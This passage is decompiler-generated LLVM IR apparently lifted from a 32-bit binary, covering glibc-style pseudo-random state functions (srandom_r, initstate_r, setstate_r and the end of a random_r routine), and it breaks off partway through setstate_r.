  %v2_80620e5 = inttoptr i32 %v3_80620e0 to i32*
  %v3_80620e5 = load i32, i32* %v2_80620e5, align 4
  %v5_80620e5 = mul i32 %v3_80620e5, 1103515245
  %v1_80620eb = add i32 %v5_80620e5, 12345
  %v1_80620f0 = urem i32 %v1_80620eb, -2147483648
  store i32 %v1_80620f0, i32* %eax.global-to-local, align 4
  store i32 %v1_80620f0, i32* %v2_80620e5, align 4
  %v0_80620f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80620f7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80620f7 = inttoptr i32 %v1_80620f7 to i32*
  store i32 %v0_80620f7, i32* %v2_80620f7, align 4
  br label %dec_label_pc_8062127

dec_label_pc_80620fc:                             ; preds = %entry
  %v2_80620fc = load i32, i32* %arg1, align 4
  store i32 %v2_80620fc, i32* %eax.global-to-local, align 4
  %v1_80620fe = add i32 %tmp3, 4
  %v2_80620fe = inttoptr i32 %v1_80620fe to i32*
  %v3_80620fe = load i32, i32* %v2_80620fe, align 4
  store i32 %v3_80620fe, i32* %ecx.global-to-local, align 4
  %v1_8062101 = add i32 %tmp3, 16
  %v2_8062101 = inttoptr i32 %v1_8062101 to i32*
  %v3_8062101 = load i32, i32* %v2_8062101, align 4
  store i32 %v3_8062101, i32* %edi.global-to-local, align 4
  %v1_8062104 = inttoptr i32 %v2_80620fc to i32*
  %v2_8062104 = load i32, i32* %v1_8062104, align 4
  store i32 %v2_8062104, i32* %edx.global-to-local, align 4
  %v2_8062106 = inttoptr i32 %v3_80620fe to i32*
  %v3_8062106 = load i32, i32* %v2_8062106, align 4
  %v4_8062106 = add i32 %v3_8062106, %v2_8062104
  store i32 %v4_8062106, i32* %edx.global-to-local, align 4
  store i32 %v4_8062106, i32* %v1_8062104, align 4
  %v0_806210a = load i32, i32* %eax.global-to-local, align 4
  %v1_806210a = add i32 %v0_806210a, 4
  store i32 %v1_806210a, i32* %eax.global-to-local, align 4
  %v0_806210d = load i32, i32* %edx.global-to-local, align 4
  %v2_806210d = udiv i32 %v0_806210d, 2
  %v1_806210f = load i32, i32* %edi.global-to-local, align 4
  %v7_806210f = icmp ult i32 %v1_806210a, %v1_806210f
  %v1_8062111 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8062111 = inttoptr i32 %v1_8062111 to i32*
  store i32 %v2_806210d, i32* %v2_8062111, align 4
  %v0_8062114 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062114 = add i32 %v0_8062114, 4
  store i32 %v1_8062114, i32* %edx.global-to-local, align 4
  br i1 %v7_806210f, label %dec_label_pc_806211d, label %dec_label_pc_8062119

dec_label_pc_8062119:                             ; preds = %dec_label_pc_80620fc
  %v0_8062119 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8062119, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062122

dec_label_pc_806211d:                             ; preds = %dec_label_pc_80620fc
  %v1_806211d = load i32, i32* %edi.global-to-local, align 4
  %v7_806211d = icmp ult i32 %v1_8062114, %v1_806211d
  %v1_806211f = icmp eq i1 %v7_806211d, false
  %v3_806211f = load i32, i32* %esi.global-to-local, align 4
  %v4_806211f = select i1 %v1_806211f, i32 %v3_806211f, i32 %v1_8062114
  store i32 %v4_806211f, i32* %edx.global-to-local, align 4
  %v0_8062122.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062122

dec_label_pc_8062122:                             ; preds = %dec_label_pc_8062119, %dec_label_pc_806211d
  %v0_8062122 = phi i32 [ %v0_8062119, %dec_label_pc_8062119 ], [ %v0_8062122.pre, %dec_label_pc_806211d ]
  %v1_8062122 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062122 = inttoptr i32 %v1_8062122 to i32*
  store i32 %v0_8062122, i32* %v2_8062122, align 4
  %v0_8062124 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062124 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062124 = add i32 %v1_8062124, 4
  %v3_8062124 = inttoptr i32 %v2_8062124 to i32*
  store i32 %v0_8062124, i32* %v3_8062124, align 4
  br label %dec_label_pc_8062127

dec_label_pc_8062127:                             ; preds = %dec_label_pc_80620e5, %dec_label_pc_8062122
  %v2_8062127 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062127, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80620f0, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8062127, { 1, 0 }
  uselistorder label %dec_label_pc_8062122, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i64, align 8
  %stack_var_-16 = alloca i32, align 4
  %v0_806212e = load i32, i32* @ebp, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v0_8062132 = load i32, i32* @edi, align 4
  %v0_8062133 = load i32, i32* @esi, align 4
  %v0_8062134 = load i32, i32* @ebx, align 4
  store i32 %v0_8062134, i32* %stack_var_-16, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8062140 = add i32 %tmp14, 12
  %v2_8062140 = inttoptr i32 %v1_8062140 to i8*
  %v3_8062140 = load i8, i8* %v2_8062140, align 1
  %v2_8062147 = sext i8 %v3_8062140 to i32
  store i32 %v2_8062147, i32* %eax.global-to-local, align 4
  %v6_806214d = icmp ugt i8 %v3_8062140, 4
  br i1 %v6_806214d, label %dec_label_pc_80621cc, label %dec_label_pc_806214f

dec_label_pc_806214f:                             ; preds = %entry
  %v1_806214f = icmp eq i32 %arg1, 0
  %v1_8062151 = add i32 %tmp14, 8
  %v2_8062151 = inttoptr i32 %v1_8062151 to i32*
  %v3_8062151 = load i32, i32* %v2_8062151, align 4
  store i32 %v3_8062151, i32* %ebx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8062159 = select i1 %v1_806214f, i32 1, i32 %arg1
  store i32 %v3_8062159, i32* %edx.global-to-local, align 4
  %v4_806215c = icmp eq i8 %v3_8062140, 0
  %v2_8062161 = inttoptr i32 %v3_8062151 to i32*
  store i32 %v3_8062159, i32* %v2_8062161, align 4
  br i1 %v4_806215c, label %dec_label_pc_80621ca, label %dec_label_pc_8062165

dec_label_pc_8062165:                             ; preds = %dec_label_pc_806214f
  %v0_8062165 = load i32, i32* @esi, align 4
  %v1_8062165 = add i32 %v0_8062165, 13
  %v2_8062165 = inttoptr i32 %v1_8062165 to i8*
  %v3_8062165 = load i8, i8* %v2_8062165, align 1
  %v0_8062169 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8062169, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %edi.global-to-local, align 4
  %v4_8062170 = sext i8 %v3_8062165 to i64
  store i64 %v4_8062170, i64* %stack_var_-44, align 8
  %v5_80621a634 = icmp sgt i8 %v3_8062165, 1
  br i1 %v5_80621a634, label %dec_label_pc_8062175, label %dec_label_pc_80621a8

dec_label_pc_8062175:                             ; preds = %dec_label_pc_8062165, %dec_label_pc_8062175.dec_label_pc_8062175_crit_edge
  %v0_806219d = phi i32 [ %v0_806219d.pre, %dec_label_pc_8062175.dec_label_pc_8062175_crit_edge ], [ %v0_8062169, %dec_label_pc_8062165 ]
  %v0_8062175 = load i32, i32* %edx.global-to-local, align 4
  %v1_806217c = ashr i32 %v0_8062175, 31
  %v2_806217d = zext i32 %v0_8062175 to i64
  %v4_806217d = zext i32 %v1_806217c to i64
  %v5_806217d = mul nuw i64 %v4_806217d, 4294967296
  %v6_806217d = or i64 %v5_806217d, %v2_806217d
  %v8_806217d = sdiv i64 %v6_806217d, 127773
  %v9_806217d = trunc i64 %v8_806217d to i32
  %v10_806217d = srem i64 %v6_806217d, 127773
  %v3_806217f = mul nsw i64 %v10_806217d, 16807
  %v4_806217f = trunc i64 %v3_806217f to i32
  %tmp24 = mul i32 %v9_806217d, -2836
  %v2_806218f = add i32 %v4_806217f, %tmp24
  %v1_8062191 = add i32 %v2_806218f, 1
  %v6_8062191 = xor i32 %v2_806218f, -2147483648
  %v7_8062191 = xor i32 %v1_8062191, %v2_806218f
  %v8_8062191 = and i32 %v7_8062191, %v6_8062191
  %v9_8062191 = icmp slt i32 %v8_8062191, 0
  %v10_8062191 = icmp eq i32 %v1_8062191, 0
  %v11_8062191 = icmp slt i32 %v1_8062191, 0
  %v1_8062194 = add i32 %v2_806218f, 2147483647
  store i32 %v1_8062194, i32* %eax.global-to-local, align 4
  %v3_806219a = icmp ne i1 %v11_8062191, %v9_8062191
  %v4_806219a = or i1 %v10_8062191, %v3_806219a
  %v7_806219a = select i1 %v4_806219a, i32 %v1_8062194, i32 %v2_806218f
  store i32 %v7_806219a, i32* %edx.global-to-local, align 4
  %v1_806219d = add i32 %v0_806219d, 4
  store i32 %v1_806219d, i32* %ecx.global-to-local, align 4
  %v2_80621a0 = inttoptr i32 %v1_806219d to i32*
  store i32 %v7_806219a, i32* %v2_80621a0, align 4
  %v0_80621a2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80621a2 = add i32 %v0_80621a2, 1
  store i32 %v1_80621a2, i32* %edi.global-to-local, align 4
  %v3_80621a3.pre = load i64, i64* %stack_var_-44, align 8
  %extract.t10 = trunc i64 %v3_80621a3.pre to i32
  %v5_80621a6 = icmp slt i32 %v1_80621a2, %extract.t10
  br i1 %v5_80621a6, label %dec_label_pc_8062175.dec_label_pc_8062175_crit_edge, label %dec_label_pc_80621a3.dec_label_pc_80621a8_crit_edge

dec_label_pc_8062175.dec_label_pc_8062175_crit_edge: ; preds = %dec_label_pc_8062175
  %v0_806219d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062175

dec_label_pc_80621a3.dec_label_pc_80621a8_crit_edge: ; preds = %dec_label_pc_8062175
  %v0_80621a8.pre = load i32, i32* @esi, align 4
  %v0_80621b0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80621a8

dec_label_pc_80621a8:                             ; preds = %dec_label_pc_80621a3.dec_label_pc_80621a8_crit_edge, %dec_label_pc_8062165
  %v0_80621b0 = phi i32 [ %v0_80621b0.pre, %dec_label_pc_80621a3.dec_label_pc_80621a8_crit_edge ], [ %v0_8062169, %dec_label_pc_8062165 ]
  %v0_80621a8 = phi i32 [ %v0_80621a8.pre, %dec_label_pc_80621a3.dec_label_pc_80621a8_crit_edge ], [ %v0_8062165, %dec_label_pc_8062165 ]
  %v1_80621a8 = add i32 %v0_80621a8, 14
  %v2_80621a8 = inttoptr i32 %v1_80621a8 to i8*
  %v3_80621a8 = load i8, i8* %v2_80621a8, align 1
  %v4_80621a8 = sext i8 %v3_80621a8 to i32
  store i32 %v4_80621a8, i32* %eax.global-to-local, align 4
  %v2_80621ac = ptrtoint i32* %stack_var_-20 to i32
  %v2_80621b0 = add i32 %v0_80621a8, 4
  %v3_80621b0 = inttoptr i32 %v2_80621b0 to i32*
  store i32 %v0_80621b0, i32* %v3_80621b0, align 4
  %v0_80621b3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80621b3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80621b3 = mul i32 %v1_80621b3, 4
  %v3_80621b3 = add i32 %v2_80621b3, %v0_80621b3
  store i32 %v3_80621b3, i32* %eax.global-to-local, align 4
  %v3_80621b6 = load i64, i64* %stack_var_-44, align 8
  %v6_80621b6 = mul nsw i64 %v3_80621b6, 10
  %v7_80621b6 = trunc i64 %v6_80621b6 to i32
  store i32 %v7_80621b6, i32* %ebx.global-to-local, align 4
  %v1_80621ba = load i32, i32* @esi, align 4
  %v2_80621ba = inttoptr i32 %v1_80621ba to i32*
  store i32 %v3_80621b3, i32* %v2_80621ba, align 4
  %v0_80621c725 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80621c726 = add i32 %v0_80621c725, -1
  %v9_80621c731 = icmp slt i32 %v1_80621c726, 0
  store i32 %v1_80621c726, i32* @ebx, align 4
  %v1_80621c832 = icmp eq i1 %v9_80621c731, false
  br i1 %v1_80621c832, label %dec_label_pc_80621be, label %dec_label_pc_80621ca

dec_label_pc_80621be:                             ; preds = %dec_label_pc_80621a8, %dec_label_pc_80621be
  %v0_80621bf = load i32, i32* @esi, align 4
  %v2_80621c0 = inttoptr i32 %v0_80621bf to i32*
  %v3_80621c0 = call i32 @__GI_random_r(i32* %v2_80621c0, i32 %v2_80621ac)
  store i32 %v0_80621bf, i32* %eax.global-to-local, align 4
  store i32 %v2_80621ac, i32* %edx.global-to-local, align 4
  %v0_80621c7 = load i32, i32* @ebx, align 4
  %v1_80621c7 = add i32 %v0_80621c7, -1
  %v9_80621c7 = icmp slt i32 %v1_80621c7, 0
  store i32 %v1_80621c7, i32* @ebx, align 4
  %v1_80621c8 = icmp eq i1 %v9_80621c7, false
  br i1 %v1_80621c8, label %dec_label_pc_80621be, label %dec_label_pc_80621ca

dec_label_pc_80621ca:                             ; preds = %dec_label_pc_80621a8, %dec_label_pc_80621be, %dec_label_pc_806214f
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_80621d1.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80621cc

dec_label_pc_80621cc:                             ; preds = %entry, %dec_label_pc_80621ca
  %v2_80621d1 = phi i32 [ %v0_8062134, %entry ], [ %v2_80621d1.pre, %dec_label_pc_80621ca ]
  %v0_80621cf = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80621ca ]
  store i32 %v0_80621cf, i32* %eax.global-to-local, align 4
  store i32 %v2_80621d1, i32* @ebx, align 4
  store i32 %v0_8062133, i32* @esi, align 4
  store i32 %v0_8062132, i32* @edi, align 4
  store i32 %v0_806212e, i32* @ebp, align 4
  ret i32 %v0_80621cf

; uselistorder directives
  uselistorder i32 %v0_80621cf, { 1, 0 }
  uselistorder i32 %v1_80621c7, { 1, 0 }
  uselistorder i32 %v0_80621a8, { 1, 0 }
  uselistorder i32 %v1_8062191, { 2, 1, 0 }
  uselistorder i32 %v2_806218f, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8062169, { 1, 0, 2 }
  uselistorder i8 %v3_8062140, { 1, 0, 2 }
  uselistorder i64* %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_80621cc, { 1, 0 }
  uselistorder label %dec_label_pc_80621ca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80621be, { 1, 0 }
  uselistorder label %dec_label_pc_8062175, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %v0_80621d8 = load i32, i32* @esi, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_80621f7, label %dec_label_pc_80621eb

dec_label_pc_80621eb:                             ; preds = %entry
  %v2_80621eb = icmp ult i32 %arg3, 256
  %v1_80621f2 = select i1 %v2_80621eb, i32 5, i32 4
  store i32 %v1_80621f2, i32* @ebx, align 4
  br label %dec_label_pc_806220d

dec_label_pc_80621f7:                             ; preds = %entry
  %v6_80621fa = icmp ugt i32 %arg3, 31
  br i1 %v6_80621fa, label %dec_label_pc_8062205, label %dec_label_pc_80621fc

dec_label_pc_80621fc:                             ; preds = %dec_label_pc_80621f7
  store i32 0, i32* @ebx, align 4
  %v6_8062201 = icmp ugt i32 %arg3, 7
  br i1 %v6_8062201, label %dec_label_pc_806220d, label %dec_label_pc_806225d

dec_label_pc_8062205:                             ; preds = %dec_label_pc_80621f7
  %v2_8062205 = icmp ult i32 %arg3, 64
  %v1_806220a = select i1 %v2_8062205, i32 3, i32 2
  store i32 %v1_806220a, i32* @ebx, align 4
  br label %dec_label_pc_806220d

dec_label_pc_806220d:                             ; preds = %dec_label_pc_80621fc, %dec_label_pc_80621eb, %dec_label_pc_8062205
  %v0_806221d = phi i32 [ 0, %dec_label_pc_80621fc ], [ %v1_80621f2, %dec_label_pc_80621eb ], [ %v1_806220a, %dec_label_pc_8062205 ]
  %v1_806220d = add i32 %v0_806221d, ptrtoint (i8** @global_var_806fb75.1635 to i32)
  %v2_806220d = inttoptr i32 %v1_806220d to i8*
  %v3_806220d = load i8, i8* %v2_806220d, align 1
  %v4_806220d = sext i8 %v3_806220d to i32
  store i32 %v4_806220d, i32* %eax.global-to-local, align 4
  %v1_8062214 = add i32 %tmp7, 4
  store i32 %v1_8062214, i32* @esi, align 4
  %v1_8062217 = add i32 %v0_806221d, ptrtoint (i8** @global_var_806fb70.1636 to i32)
  %v2_8062217 = inttoptr i32 %v1_8062217 to i8*
  %v3_8062217 = load i8, i8* %v2_8062217, align 1
  %v4_8062217 = zext i8 %v3_8062217 to i32
  %v5_8062217 = load i32, i32* @edx, align 4
  %v6_8062217 = and i32 %v5_8062217, -256
  %v7_8062217 = or i32 %v6_8062217, %v4_8062217
  store i32 %v7_8062217, i32* %edx.global-to-local, align 4
  %v1_806221d = trunc i32 %v0_806221d to i8
  %v3_806221d = add i32 %arg4, 12
  %v4_806221d = inttoptr i32 %v3_806221d to i8*
  store i8 %v1_806221d, i8* %v4_806221d, align 1
  %v0_8062220 = load i32, i32* @esi, align 4
  %v1_8062220 = load i32, i32* @edi, align 4
  %v2_8062220 = add i32 %v1_8062220, 8
  %v3_8062220 = inttoptr i32 %v2_8062220 to i32*
  store i32 %v0_8062220, i32* %v3_8062220, align 4
  %v0_8062223 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062223 = trunc i32 %v0_8062223 to i8
  %v2_8062223 = load i32, i32* @edi, align 4
  %v3_8062223 = add i32 %v2_8062223, 13
  %v4_8062223 = inttoptr i32 %v3_8062223 to i8*
  store i8 %v1_8062223, i8* %v4_8062223, align 1
  %v0_8062226 = load i32, i32* @esi, align 4
  %v1_8062226 = load i32, i32* %eax.global-to-local, align 4
  %v2_8062226 = mul i32 %v1_8062226, 4
  %v3_8062226 = add i32 %v2_8062226, %v0_8062226
  store i32 %v3_8062226, i32* %eax.global-to-local, align 4
  %v0_8062229 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062229 = trunc i32 %v0_8062229 to i8
  %v2_8062229 = load i32, i32* @edi, align 4
  %v3_8062229 = add i32 %v2_8062229, 14
  %v4_8062229 = inttoptr i32 %v3_8062229 to i8*
  store i8 %v1_8062229, i8* %v4_8062229, align 1
  %v0_806222c = load i32, i32* %eax.global-to-local, align 4
  %v1_806222c = load i32, i32* @edi, align 4
  %v2_806222c = add i32 %v1_806222c, 16
  %v3_806222c = inttoptr i32 %v2_806222c to i32*
  store i32 %v0_806222c, i32* %v3_806222c, align 4
  %v0_806222f = load i32, i32* @edi, align 4
  %v2_8062234 = inttoptr i32 %v0_806222f to i32*
  %v3_8062234 = call i32 @srandom_r(i32 %arg1, i32* %v2_8062234)
  %v0_8062239 = load i32, i32* @ebp, align 4
  %v1_8062239 = inttoptr i32 %v0_8062239 to i32*
  store i32 0, i32* %v1_8062239, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8062244 = load i32, i32* @ebx, align 4
  %v1_8062244 = icmp eq i32 %v0_8062244, 0
  br i1 %v1_8062244, label %dec_label_pc_806226c, label %dec_label_pc_8062248

dec_label_pc_8062248:                             ; preds = %dec_label_pc_806220d
  %v0_8062248 = load i32, i32* @edi, align 4
  %v1_8062248 = add i32 %v0_8062248, 4
  %v2_8062248 = inttoptr i32 %v1_8062248 to i32*
  %v3_8062248 = load i32, i32* %v2_8062248, align 4
  %v1_806224b = load i32, i32* @esi, align 4
  %v2_806224b = sub i32 %v3_8062248, %v1_806224b
  %v2_806224d = sdiv i32 %v2_806224b, 4
  %v3_8062250 = mul i32 %v2_806224d, 5
  %v2_8062253 = add i32 %v3_8062250, %v0_8062244
  %v1_8062256 = load i32, i32* @ebp, align 4
  %v2_8062256 = inttoptr i32 %v1_8062256 to i32*
  store i32 %v2_8062253, i32* %v2_8062256, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806226c

dec_label_pc_806225d:                             ; preds = %dec_label_pc_80621fc
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806226c

dec_label_pc_806226c:                             ; preds = %dec_label_pc_806220d, %dec_label_pc_8062248, %dec_label_pc_806225d
  %v0_8062270 = phi i32 [ 0, %dec_label_pc_806220d ], [ 0, %dec_label_pc_8062248 ], [ -1, %dec_label_pc_806225d ]
  store i32 %v0_80621d8, i32* @esi, align 4
  ret i32 %v0_8062270

; uselistorder directives
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_806226c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806220d, { 2, 0, 1 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp6 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %v0_8062273 = load i32, i32* @ebx, align 4
  store i32 %v0_8062273, i32* %stack_var_-12, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_806227f = add i32 %tmp6, 12
  %v2_806227f = inttoptr i32 %v1_806227f to i8*
  %v3_806227f = load i8, i8* %v2_806227f, align 1
  %v1_8062282 = add i32 %arg1, 4
  store i32 %v1_8062282, i32* %esi.global-to-local, align 4
  %v1_8062285 = add i32 %tmp6, 8
  %v2_8062285 = inttoptr i32 %v1_8062285 to i32*
  %v3_8062285 = load i32, i32* %v2_8062285, align 4
  store i32 %v3_8062285, i32* %ecx.global-to-local, align 4
  %v4_8062288 = icmp eq i8 %v3_806227f, 0
  store i1 %v4_8062288, i1* %zf.global-to-local, align 1
  %v1_806228a = icmp eq i1 %v4_8062288, false
  br i1 %v1_806228a, label %dec_label_pc_8062295, label %dec_label_pc_806228c

dec_label_pc_806228c:                             ; preds = %entry
  %v1_806228c = add i32 %v3_8062285, -4
  %v2_806228c = inttoptr i32 %v1_806228c to i32*
  store i32 0, i32* %v2_806228c, align 4
  br label %dec_label_pc_80622a8

dec_label_pc_8062295:                             ; preds = %entry
  %v1_8062295 = add i32 %tmp6, 4
  %v2_8062295 = inttoptr i32 %v1_8062295 to i32*
  %v3_8062295 = load i32, i32* %v2_8062295, align 4
  %v2_8062298 = sext i8 %v3_806227f to i32
  %v2_806229b = sub i32 %v3_8062295, %v3_8062285
  %v2_806229d = sdiv i32 %v2_806229b, 4
  %v3_80622a0 = mul i32 %v2_806229d, 5
  %v2_80622a3 = add i32 %v3_80622a0, %v2_8062298
  %v12_80622a3 = icmp eq i32 %v2_80622a3, 0
  store i1 %v12_80622a3, i1* %zf.global-to-local, align 1
  store i32 %v2_80622a3, i32* %eax.global-to-local, align 4
  %v2_80622a5 = add i32 %v3_8062285, -4
  %v3_80622a5 = inttoptr i32 %v2_80622a5 to i32*
  store i32 %v2_80622a3, i32* %v3_80622a5, align 4
  br label %dec_label_pc_80622a8

dec_label_pc_80622a8:                             ; preds = %dec_label_pc_806228c, %dec_label_pc_8062295
  %v0_80622a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80622a8 = add i32 %v0_80622a8, -4
  %v2_80622a8 = inttoptr i32 %v1_80622a8 to i32*
  %v3_80622a8 = load i32, i32* %v2_80622a8, align 4
  store i32 5, i32* %ecx.global-to-local, align 4
  %v1_80622b2 = ashr i32 %v3_80622a8, 31
  %v2_80622b3 = zext i32 %v3_80622a8 to i64
  %v4_80622b3 = zext i32 %v1_80622b2 to i64
  %v5_80622b3 = mul nuw i64 %v4_80622b3, 4294967296
  %v6_80622b3 = or i64 %v5_80622b3, %v2_80622b3
  %v8_80622b3 = sdiv i64 %v6_80622b3, 5
  %v9_80622b3 = trunc i64 %v8_80622b3 to i32
  store i32 %v9_80622b3, i32* %eax.global-to-local, align 4
  %v10_80622b3 = srem i64 %v6_80622b3, 5
  %v12_80622b3 = trunc i64 %v10_80622b3 to i8
  %v1_80622b5 = sext i8 %v12_80622b3 to i32
  %v11_80622b5 = icmp eq i8 %v12_80622b3, 4
  store i1 %v11_80622b5, i1* %zf.global-to-local, align 1
  store i32 %v9_80622b3, i32* %edi.global-to-local, align 4
  %v7_80622ba = icmp ugt i8 %v12_80622b3, 4
  br i1 %v7_80622ba, label %dec_label_pc_80622fe, label %dec_label_pc_80622bc

dec_label_pc_80622bc:                             ; preds = %dec_label_pc_80622a8
  %v2_80622bc = add i32 %v1_80622b5, ptrtoint (i8** @global_var_806fb75.1635 to i32)
  %v3_80622bc = inttoptr i32 %v2_80622bc to i8*
  %v4_80622bc = load i8, i8* %v3_80622bc, align 1
  %v5_80622bc = zext i8 %v4_80622bc to i32
  %v7_80622bc = and i32 %v9_80622b3, -256
  %v8_80622bc = or i32 %v5_80622bc, %v7_80622bc
  store i32 %v8_80622bc, i32* %eax.global-to-local, align 4
  %v2_80622c2 = icmp eq i8 %v12_80622b3, 0
  store i1 %v2_80622c2, i1* %zf.global-to-local, align 1
  %v2_80622c4 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80622c4 = add i32 %v2_80622c4, 13
  %v4_80622c4 = inttoptr i32 %v3_80622c4 to i8*
  store i8 %v4_80622bc, i8* %v4_80622c4, align 1
  %v0_80622c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80622c7 = mul i32 %v0_80622c7, 16777216
  %v2_80622c7 = sdiv i32 %v1_80622c7, 16777216
  store i32 %v2_80622c7, i32* %ecx.global-to-local, align 4
  %v2_80622ca = add i32 %v1_80622b5, ptrtoint (i8** @global_var_806fb70.1636 to i32)
  %v3_80622ca = inttoptr i32 %v2_80622ca to i8*
  %v4_80622ca = load i8, i8* %v3_80622ca, align 1
  %v5_80622ca = zext i8 %v4_80622ca to i32
  %v7_80622ca = and i32 %v0_80622c7, -256
  %v8_80622ca = or i32 %v5_80622ca, %v7_80622ca
  store i32 %v8_80622ca, i32* %eax.global-to-local, align 4
  %v2_80622d4 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80622d4 = add i32 %v2_80622d4, 14
  %v4_80622d4 = inttoptr i32 %v3_80622d4 to i8*
  store i8 %v4_80622ca, i8* %v4_80622d4, align 1
  %v3_80622d7 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80622d7 = add i32 %v3_80622d7, 12
  %v5_80622d7 = inttoptr i32 %v4_80622d7 to i8*
  store i8 %v12_80622b3, i8* %v5_80622d7, align 1
  %v0_80622da = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80622da, label %dec_label_pc_80622f1, label %dec_label_pc_80622dc

dec_label_pc_80622dc:                             ; preds = %dec_label_pc_80622bc
  %v0_80622dc = load i32, i32* %esi.global-to-local, align 4
  %v1_80622dc = load i32, i32* %edi.global-to-local, align 4
  %v2_80622dc = mul i32 %v1_80622dc, 4
  %v3_80622dc = add i32 %v2_80622dc, %v0_80622dc
  %v1_80622df = load i32, i32* %ebx.global-to-local, align 4
  %v2_80622df = add i32 %v1_80622df, 4
  %v3_80622df = inttoptr i32 %v2_80622df to i32*
  store i32 %v3_80622dc, i32* %v3_80622df, align 4
  %v5_80622e2 = sext i8 %v4_80622ca to i32
  %v1_80622e7 = load i32, i32* %edi.global-to-local, align 4
  %v2_80622e7 = add i32 %v1_80622e7, %v5_80622e2
  %v12_80622e7 = icmp eq i32 %v2_80622e7, 0
  store i1 %v12_80622e7, i1* %zf.global-to-local, align 1
  %v1_80622e9 = ashr i32 %v2_80622e7, 31
  %v0_80622ea = load i32, i32* %ecx.global-to-local, align 4
  %v2_80622ea = zext i32 %v2_80622e7 to i64
  %v4_80622ea = zext i32 %v1_80622e9 to i64
  %v5_80622ea = mul nuw i64 %v4_80622ea, 4294967296
  %v6_80622ea = or i64 %v5_80622ea, %v2_80622ea
  %v7_80622ea = zext i32 %v0_80622ea to i64
  %v8_80622ea = sdiv i64 %v6_80622ea, %v7_80622ea
  %v9_80622ea = trunc i64 %v8_80622ea to i32
  store i32 %v9_80622ea, i32* %eax.global-to-local, align 4
  %v10_80622ea = srem i64 %v6_80622ea, %v7_80622ea
  %v11_80622ea = trunc i64 %v10_80622ea to i32
  %v0_80622ec = load i32, i32* %esi.global-to-local, align 4
  %v2_80622ec = mul i32 %v11_80622ea, 4
  %v3_80622ec = add i32 %v2_80622ec, %v0_80622ec
  %v1_80622ef = load i32, i32* %ebx.global-to-local, align 4
